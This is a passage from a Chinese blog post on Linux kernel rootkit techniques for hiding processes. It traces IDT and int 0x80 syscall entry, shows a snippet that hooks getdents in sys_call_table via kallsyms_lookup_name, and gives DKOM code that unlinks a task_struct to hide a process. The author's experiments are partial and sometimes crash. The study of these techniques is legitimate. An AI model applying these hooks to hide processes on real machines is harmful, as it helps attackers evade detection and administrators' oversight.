class="line"></span><br><span class="line"> /*</span><br><span class="line">  * Should be a barrier for any external CPU state:</span><br><span class="line">  */</span><br><span class="line"> cpu_init();</span><br><span class="line"></span><br><span class="line"> idt_setup_ist_traps();</span><br><span class="line"></span><br><span class="line"> x86_init.irqs.trap_init();</span><br><span class="line"></span><br><span class="line"> idt_setup_debugidt_traps();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这儿的代码注释就说的很明显了，最后重载的地址是<code>CPU_ENTRY_AREA_RO_IDT</code>也是<code>只读线性地址</code>，而这个地址是<code>idt_table</code>映射来的最后通过<code>cpu_init()</code>重载。 去跟<code>idt_table</code>的结构体会发现是<code>gate_struct</code>，不再是资料上的<code>idt</code>了。</p><blockquote><p>提取基地址中的<code>low</code>+<code>middle</code>+<code>high</code>共同组成了一个<code>divide_error</code>，也就是0号地址。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct _gate_struct &#123;</span><br><span class="line"> u16 offset_low;</span><br><span class="line"> u16 segment;</span><br><span class="line"> struct idt_bits bits;</span><br><span class="line"> u16 offset_middle;</span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> u32 offset_high;</span><br><span class="line"> u32 reserved;</span><br><span class="line">#endif</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>再向后看一个函数，就很有意思了，也就是针对<code>gate_desc</code>的处理</p><blockquote><p>typedef struct gate_struct gate_desc;</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static inline unsigned long gate_offset(const gate_desc *g)</span><br><span class="line">&#123;</span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> return g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16) |</span><br><span class="line">  ((unsigned long) g-&gt;offset_high &lt;&lt; 32);</span><br><span class="line">#else</span><br><span class="line"> return g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的意思就是说一个<code>中断例程函数</code>比如<code>系统调用</code>的地址是通过<code>g-&gt;offset_low | ((unsigned long)g-&gt;offset_middle &lt;&lt; 16) | ((unsigned long) g-&gt;offset_high &lt;&lt; 32)</code>计算出来的。 <code>系统调用例程</code>的<code>中断号</code>是<code>128</code>也就是<code>0x80</code>，这样就可以通过<code>idtr.base</code>也就是<code>idt_table</code>基地址来获取到我们需要的那一个<code>门描述符</code>地址，即<code>idt_table+16*0x80</code></p><blockquote><p>在<code>x86_64</code>中一个<code>idt</code>是<code>16</code>字节，因此这儿特别注意，不能照抄<code>8*0x80</code>!!!!这儿我一开始照抄完全定位不到想要的函数，排查了很久。推荐文章<a href="https://www.binss.me/blog/interrupt-and-exception/">中断和异常</a></p></blockquote><p>然而获取的地址却和我想的不同，通过计算获得的地址对应的<code>内核符号</code>是<code>entry_INT80_compat</code>而非<code>entry_SYSCALL_64</code>，源码在<code>/arch/x86/entry/entry_64_compat.S</code>。其中<code>call</code>了一个函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* Handles int $0x80 */</span><br><span class="line">__visible void do_int80_syscall_32(struct pt_regs *regs)</span><br><span class="line">&#123;</span><br><span class="line"> enter_from_user_mode();</span><br><span class="line"> local_irq_enable();</span><br><span class="line"> do_syscall_32_irqs_on(regs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释就应该知道这个函数是<code>int 0x80</code>的函数。看名字的话<code>enter_from_user_mode</code>是将进程陷入<code>内核态</code>，<code>IRQ</code>是<code>中断请求(Interrupt Request)</code>，那<code>local_irq_enable()</code>就应该是针对<code>请求</code>的<code>放行</code>之类的处理，最后就看<code>do_syscall_32_irqs_on</code>，到这就完全卡住了，因为逻辑不对啊，怎么是<code>32</code>位的方式？</p><blockquote><p><a href="https://www.binss.me/blog/the-analysis-of-linux-system-call/">Linux系统调用过程分析</a>这篇文章，讲的特别好而且清楚，而且其中的历史解开了我很多在看源码时产生的疑惑，比如多种系统调用的方式。</p></blockquote><p>查阅了资料知道了三种<code>系统调用</code>，<code>64</code>位的系统下系统调用方式都被统一成<code>syscall</code>了而不是传统的<code>int 0x80</code>，不然在<code>do_syscall_32_irqs_on</code>就通过<code>32位的系统调用表</code>把流程走完了，也就是<code> regs-&gt;ax = ia32_sys_call_table[nr]</code>，这样是拿不到<code>64</code>位的表的。</p><blockquote><p>这点有历史原因，参照上面的文章，大概就是在某个时期<code>Intel</code>和<code>AMD</code>分开创建了新的<code>系统调用指令</code>分别是<code>sysenter</code>和<code>syscall</code>，解决了<code>软中断</code>进行<code>系统调用</code>太慢的问题，然而在<code>64</code>位上<code>intel</code>却发现<code>x86</code>架构的程序不能用了，只能也跟着用起了<code>syscall</code></p></blockquote><p>而通过<code>idt</code>获取到的<code>entry_INT80_compat</code>官方给出的解释是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry_INT80_compat: int 0x80 from 32-bit or 64-bit code; compat syscall either way.</span><br></pre></td></tr></table></figure><p>同样在<code>entry_32.S</code>中也能找到注解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64-bit programs can use INT $0x80 as well, but they can only run on 64-bit kernels and therefore land in entry_INT80_compat.</span><br></pre></td></tr></table></figure><p>再往后看到<code>entry_64.S</code>的注解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This entry point can be used by 32-bit and 64-bit programs to perform 32-bit system calls.</span><br></pre></td></tr></table></figure><p>意思就是这还是一种<code>int 0x80</code>的<code>系统调用</code>方式，只不过是兼容模式。而先前我以为会调用的<code>entry_SYSCALL_64</code>实际上是<code>64</code>位下<code>syscall</code>的程序逻辑。 但是我<code>printk</code>了一下内存的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[10969.058294] [address]idt_table=0xfffffe0000000000</span><br><span class="line">[10969.058295] [address]entry_INT80_compat=0xffffffff8f801c00</span><br><span class="line">[10969.058296] [memory]e8 b2 1f 60 ff</span><br><span class="line">[10969.058297] [address]do_int80_syscall_32=0xffffffff8ee03c00</span><br><span class="line">[10969.058298] [memory]e8 92 f3 bf 0</span><br><span class="line">[10969.058298] [address]call=0xffffffff8fa03000</span><br></pre></td></tr></table></figure><p>确实是依次发现了<code>idt_table</code>-&gt;<code>entry_INT80_compat</code>-&gt;<code>do_int80_syscall_32</code>，然后再次打印内存中的<code>[address]call</code>地址时却发现调用的不是本该以为的函数，而是<code>__x86_indirect_thunk_rax</code>。 重开流程： <code>0x80</code>在哪定义的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/arch/x86/include/asm/irq_vectors.h</span><br><span class="line">#define IA32_SYSCALL_VECTOR 0x80</span><br></pre></td></tr></table></figure><p>谁来用这个<code>0x80</code>？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if defined(CONFIG_IA32_EMULATION)</span><br><span class="line"> SYSG(IA32_SYSCALL_VECTOR, entry_INT80_compat),</span><br><span class="line">#elif defined(CONFIG_X86_32)</span><br><span class="line"> SYSG(IA32_SYSCALL_VECTOR, entry_INT80_32),</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><blockquote><p><code>SYSG</code>是用来设置<code>系统中断门</code>的函数</p></blockquote><p>我的内核开启了<code>CONFIG_IA32_EMULATION</code>，所以<code>0x80</code>的<code>系统中断门</code>是<code>entry_INT80_compat</code>，至此是从<code>idt</code>到指定<code>系统中断门</code>的真正过程。</p><blockquote><p>意思就是说，在<code>64</code>位的系统上本该走<code>syscall</code>的道路，但是为了研究<code>idt</code>结果就强行走上了歪路。</p></blockquote><p><code>stackoverFlow</code>上有个关于这个的问题：</p><blockquote><p><a href="https://stackoverflow.com/questions/46087730/what-happens-if-you-use-the-32-bit-int-0x80-linux-abi-in-64-bit-code">What happens if you use the 32-bit int 0x80 Linux ABI in 64-bit code?</a></p></blockquote><p>实际上<code>entry_64_compat.S</code>什么时候会用到呢？先重新看一下<code>entry_64_compat.S</code>的注解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It is also used by the vDSO&#x27;s __kernel_vsyscall fallback for hardware that doesn&#x27;t support a faster entry method.</span><br></pre></td></tr></table></figure><p>并且同文件下实现的<code>entry_SYSCALL_compat</code>和<code>entry_SYSENTER_compat</code>也都提到了这个，并且都是<code>through the vDSO&#39;s __kernel_vsyscall enter here</code>。</p><blockquote><p><code>__kernel_vsyscall</code>是一个能够选取最快系统调用方式的机制。<code>syscall</code>和<code>sysenter</code>的引入是因为<code>cpu</code>的变化，那么就必然会出现有的机器并不会支持，但是<code>int 0x80</code>又太慢了，那就换一个方式，<code>glibc</code>不再直接接触到具体的系统调用的地址，而是从一个<code>约定的地址</code>调用，至于这个地址到底是什么<code>系统调用方式</code>，就让另外逻辑根据<code>机器</code>的情况来选择，而这个约定的地址就是<code>vsyscall</code>的地址。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__kernel_vsyscall:</span><br><span class="line"> CFI_STARTPROC</span><br><span class="line"> pushl %ecx</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET ecx, 0</span><br><span class="line"> pushl %edx</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET edx, 0</span><br><span class="line"> pushl %ebp</span><br><span class="line"> CFI_ADJUST_CFA_OFFSET 4</span><br><span class="line"> CFI_REL_OFFSET ebp, 0</span><br><span class="line"></span><br><span class="line"> #define SYSENTER_SEQUENCE &quot;movl %esp, %ebp; sysenter&quot;</span><br><span class="line"> #define SYSCALL_SEQUENCE &quot;movl %ecx, %ebp; syscall&quot;</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_X86_64</span><br><span class="line"> /* If SYSENTER (Intel) or SYSCALL32 (AMD) is available, use it. */</span><br><span class="line"> ALTERNATIVE_2 &quot;&quot;, SYSENTER_SEQUENCE, X86_FEATURE_SYSENTER32, \</span><br><span class="line">                   SYSCALL_SEQUENCE, X86_FEATURE_SYSCALL32</span><br><span class="line">#else</span><br><span class="line"> ALTERNATIVE &quot;&quot;, SYSENTER_SEQUENCE, X86_FEATURE_SEP</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line"> /* Enter using int $0x80 */</span><br><span class="line"> int $0x80</span><br></pre></td></tr></table></figure><p>就是说，<code>idt</code>已经拿不到<code>64</code>位所需要的<code>sys_call_table</code>了。</p><blockquote><p>不知道是不是真的是这样</p></blockquote><p>还是直接通过<code>System.map</code>或者是<code>kallsyms</code>搞吧，直接拿到<code>sys_call_table</code>地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_call_table = kallsyms_lookup_name(&quot;sys_call_table&quot;);</span><br><span class="line">old_sys_getdents = sys_call_table[__NR_getdents];</span><br><span class="line">sys_call_table[__NR_getdents] = new_sys_getdents;</span><br></pre></td></tr></table></figure><p><code>sys_getdents</code>这个函数的实现在<code>/fs/readdir.c</code>中，现在<code>sys_xxx</code>只有函数声明了，真实的调用都改成了<code>SYSCALL_DEFINE</code>来实现，据说这是为了解决一个<code>CVE-2009-2009</code>的漏洞。</p><blockquote><p>具体的代码替换实在不想弄了，因为看了半天感觉又涉及到了<code>VFS</code>那一块的东西，不想再跟一次了，有兴趣的参照<a href="https://github.com/hschen0712/process-hiding/blob/master/Method2/hook.c">process-hiding&#x2F;Method2&#x2F;hook.c</a></p></blockquote><h3 id="DKOM脱链"><a href="#DKOM脱链" class="headerlink" title="DKOM脱链"></a>DKOM脱链</h3><blockquote><p>本该是LKM系列的最后一个<code>hook</code>方式了，也是最为难查的一种<code>hook</code></p></blockquote><p>先前<code>VFS</code>就曾经提到过，在linux的内核里<code>进程</code>是放在链表里的。</p><blockquote><p>当前系统中的所有进程在进程终止前都会存在于各种链表中，但是只有当进程处于就绪态时会被调度器调度执行，否则永远无法被调度；当进程终止时从链表中清除，从而结束其生命过程</p></blockquote><p>当时只是提了这句话，回想一下先前<code>VFS进程隐藏</code>的实现，是通过查询到<code>进程名</code>后不去填充<code>结构体</code>生成目录，那么这儿是查询什么获取到<code>进程名</code>的？是从<code>task_struct</code>中提取到的，这是一个<code>进程结构体</code>，然而这些<code>进程结构体</code>在linux的内核中是存放在一个叫做<code>tasklist</code>的双向链表中，大概是这个样子的： 这是一个<code>双向循环链表</code> <a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/74429752.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/74429752.png" alt="74429752.png"></a></p><p>其中<code>next</code>和<code>prev</code>组成了一个连接对，而这在一个进程中的具体表现是<code>list_head</code>，每一个<code>task_struct</code>都包含了这个结构体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct list_head &#123;</span><br><span class="line"> struct list_head *next, *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>结构体</code>刚创建还未插入<code>链表</code>时，<code>next</code>和<code>prev</code>都是初始化指向自身的，链表并不关心数据层的类型，只关心<code>next</code>和<code>prev</code>指向谁。这样的不同的双向循环链表结构会提供给内核中的各个相关机制使用。那<code>DKOM隐藏</code>的原理就是把指定的<code>task_struct</code>从这个链表中提取出来。</p><blockquote><p><code>断链重连</code>？</p></blockquote><p>整个攻击的顺序就应该是:</p><ol><li>获取到链表</li><li>遍历链表找到指定的<code>task_struct</code></li><li>记录指定<code>task_struct</code>的<code>list_head</code></li><li>修改指定<code>task_struct</code>前后的<code>list_head</code>，将其连接起来。</li></ol><blockquote><p>但是这儿有个问题就是不能破坏掉<code>cpu</code>调度的那一条链表，否则被隐藏的<code>进程</code>就失去了被调度的能力，彻底<code>消失</code>。</p></blockquote><p>对于一个链表来说存在遍历函数<code>list_for_each_entry</code>还有<code>list_entry</code>，如果在遍历过程中直接使用<code>list_del</code>宏的话，就会出问题，因为<code>list_del</code>的效果是把<code>next</code>和<code>prev</code>设置成<code>LIST_POISON1</code>和<code>LIST_POISON2</code>，这会导致遍历的指针移动被中断，然后内核就<code>patch</code>了，这样就需要自己缓存<code>next</code>指针让遍历操作连贯起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">current_head=&amp;(current-&gt;thread_group);</span><br><span class="line">list_for_each_entry(current_task,current_head,thread_group)&#123;</span><br><span class="line"> if(strcmp(&quot;bash&quot;,current_task-&gt;comm)==0)&#123;</span><br><span class="line">  hide_task = current_task;</span><br><span class="line">  hide_head= current_head;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">prev_task= list_entry(hide_head-&gt;prev,typeof(*hide_task),thread_group);</span><br><span class="line">next_task= list_entry(hide_head-&gt;next,typeof(*hide_task),thread_group);</span><br><span class="line">prev_task-&gt;thread_group.next = &amp;(next_task-&gt;thread_group);</span><br><span class="line">next_task-&gt;thread_group.prev = &amp;(prev_task-&gt;thread_group);</span><br><span class="line">list_del_init(hide_head);</span><br></pre></td></tr></table></figure><p>再次查询<code>双向链表</code>时候发现确实已经脱链了，然而还是能<code>ps</code>到指定的<code>进程</code>，而且后面还各种内核崩溃，只能重新去研究看看<code>proc_pid_readdir</code>的实现，看下别人是怎么找到的<code>进程</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_pid_readdir -&gt; next_tgid -&gt; pid_task -&gt; hlist_entry</span><br></pre></td></tr></table></figure><p>这儿就不得不再引入一种新的链表结构叫做<code>进程哈希链表</code>。</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/76368721.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/76368721.png" alt="76368721.png"></a></p><p>表头节点结构体:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_head &#123;</span><br><span class="line"> struct hlist_node *first;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>链表节点结构体:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node &#123;</span><br><span class="line"> struct hlist_node *next, **pprev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中表头的<code>first</code>指向第一个节点，节点的<code>next</code>指向下一个节点的<code>next</code>，直到结尾指向<code>NULL</code>，节点的<code>prev</code>指向前一个节点的<code>next</code>，这是为了方便<code>头节点</code>和第一个<code>链表节点</code>作连接。 利用<code>DKOM脱链</code>就需要先知道对应的<code>进程</code>在链中的位置，也就是知道<code>hlist_head</code>信息，而在用户态下能够拿到的东西也只有<code>进程ID</code>而已，那就要先进行这样的一个流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pid =&gt; struct pid =&gt; task_struct</span><br><span class="line">..........下</span><br><span class="line">hiden_struct = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br></pre></td></tr></table></figure><blockquote><p>这儿需要注意的是<code>pid</code>的类型为<code>pid_t</code>这代表是一个<code>virtual id</code></p></blockquote><p>针对一个<code>task_struct</code>来说</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node *n =&gt;  task_struct-&gt;pids[PIDTYPE_MAX]-&gt;node</span><br><span class="line">struct hlist_head *h =&gt; task_struct-&gt;pids[PIDTYPE_MAX]-&gt;pid-&gt;task[PIDTYPE_MAX]</span><br></pre></td></tr></table></figure><p>重新看一下<code>pid_task</code>，可以发现这样一个判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (first)</span><br><span class="line">    result = hlist_entry(first, struct task_struct, pids[(type)].node);</span><br></pre></td></tr></table></figure><p>先看一下<code>hlist_entry</code>的实现，来源于<code>container_of</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define hlist_entry(ptr, type, member) container_of(ptr,type,member)</span><br></pre></td></tr></table></figure><p>这个函数会根据一个结构体变量中的域成员变量的指针来获取指向整个结构体变量的指针。</p><ul><li>一个例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct demo_struct &#123; </span><br><span class="line">           type1 member1; </span><br><span class="line">           type2 member2; </span><br><span class="line">           type3 member3; </span><br><span class="line">           type4 member4; </span><br><span class="line">&#125;;      </span><br><span class="line">struct demo_struct demo;</span><br><span class="line">type3 *memp = get_member_pointer_from_demo(); //这是demo中的member3的成员指针</span><br><span class="line">struct demo_struct *demop = container_of(memp, struct demo_struct, member3); //获得原结构体的指针</span><br></pre></td></tr></table></figure><p>这个函数是根据<code>first</code>来取得<code>task_struct</code>的，那接着看<code>first</code>怎么获取的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct hlist_node *first;</span><br><span class="line">first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">                  lockdep_tasklist_lock_is_held());</span><br></pre></td></tr></table></figure><blockquote><p>到此引入了新的知识点：<code>linux的RCU机制</code></p></blockquote><p><code>first</code>是通过<code>&amp;pid-&gt;tasks[type]</code>找到的，然而这还是在一个判断中，那就再看这个判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *result = NULL;</span><br><span class="line"> if (pid) &#123;</span><br></pre></td></tr></table></figure><p>再看<code>pid_task</code>的函数入口，再想一想先前如何根据一个<code>pid</code>获取到一个<code>task_struct</code>，这儿的<code>type</code>自然是<code>PIDTYPE_PID</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct task_struct *pid_task(struct pid *pid, enum pid_type type)</span><br></pre></td></tr></table></figure><p>这就是说此函数实际上是在遍历<code>tasks[PIDTYPE_PID]</code>这个哈希表从而获取到对应的进程。那先尝试一下直接把<code>pid=null</code>试试会怎样呢？</p><blockquote><p>内核崩了～猜测大概是因为断链了吧～</p></blockquote><p>重新想一想到底要研究的是什么？</p><ul><li>只有一个<code>pid_t</code>，在链表中定位到它，并将其隐藏</li></ul><p>回顾先前的一个函数<code>find_vpid</code>，这个函数怎么通过<code>pid_t</code>找到一个<code>pid</code>的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_vpid(int nr)</span><br><span class="line">&#123;</span><br><span class="line"> return find_pid_ns(nr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_vpid);</span><br></pre></td></tr></table></figure><p>这个函数是通过<code>find_pid_ns</code>来实现的，传入参数是<code>nr</code>和<code>ns</code>，其中<code>nr</code>也就是<code>pid_t</code>，返回的就是一个<code>pid</code>，若不存在就返回<code>pid=null</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct pid *find_pid_ns(int nr, struct pid_namespace *ns)</span><br><span class="line">&#123;</span><br><span class="line"> return idr_find(&amp;ns-&gt;idr, nr);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_pid_ns);</span><br></pre></td></tr></table></figure><blockquote><p>然而跟进到函数当中去后，又发现了大概涉及到了<code>IDR</code>机制。。。。</p></blockquote><p>其中<code>task_active_pid_ns</code>这一个函数的实现组合代码贴出来看一下，首先明白一下<code>current</code>指的是当前的<code>task_struct</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct pid_namespace *task_active_pid_ns(struct task_struct *tsk)</span><br><span class="line">&#123;</span><br><span class="line"> return ns_of_pid(task_pid(tsk));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(task_active_pid_ns);</span><br><span class="line"></span><br><span class="line">static inline struct pid *task_pid(struct task_struct *task)</span><br><span class="line">&#123;</span><br><span class="line"> return task-&gt;pids[PIDTYPE_PID].pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * ns_of_pid() returns the pid namespace in which the specified pid was</span><br><span class="line"> * allocated.</span><br><span class="line"> *</span><br><span class="line"> * NOTE:</span><br><span class="line"> * ns_of_pid() is expected to be called for a process (task) that has</span><br><span class="line"> * an attached &#x27;struct pid&#x27; (see attach_pid(), detach_pid()) i.e @pid</span><br><span class="line"> * is expected to be non-NULL. If @pid is NULL, caller should handle</span><br><span class="line"> * the resulting NULL pid-ns.</span><br><span class="line"> */</span><br><span class="line">static inline struct pid_namespace *ns_of_pid(struct pid *pid)</span><br><span class="line">&#123;</span><br><span class="line"> struct pid_namespace *ns = NULL;</span><br><span class="line"> if (pid)</span><br><span class="line">  ns = pid-&gt;numbers[pid-&gt;level].ns;</span><br><span class="line"> return ns;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这儿就必须要去看一下<code>PID</code>的框架设计了。</p><blockquote><p>借用参考图</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/5963eff7-f6a7-4cf8-94c3-876deb9786bb.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/5963eff7-f6a7-4cf8-94c3-876deb9786bb.png" alt="5963eff7-f6a7-4cf8-94c3-876deb9786bb.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid_hash[]: 这是一个hash表的结构，根据 pid 的 nr 值哈希到其某个表项，若有多个 pid 结构对应到同一个表项，这里解决冲突使用的是散列表法。这样，就能解决根据PID值怎样快速地找到task_struct结构体的问题了：</span><br><span class="line">首先通过 PID 计算 pid 挂接到哈希表 pid_hash[] 的表项</span><br><span class="line">遍历该表项，找到 pid 结构体中 nr 值与 PID 值相同的那个 pid</span><br><span class="line">再通过该 pid 结构体的 tasks 指针找到 node</span><br><span class="line">最后根据内核的 container_of 机制就能找到 task_struct 结构体</span><br></pre></td></tr></table></figure><blockquote><p>但这是最简单的数据结构，是没有考虑到进程间关系的。</p></blockquote><p>再借一张图：</p><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/e1b0b0eb-3299-4682-819b-d1882c3b32c3.png"><img 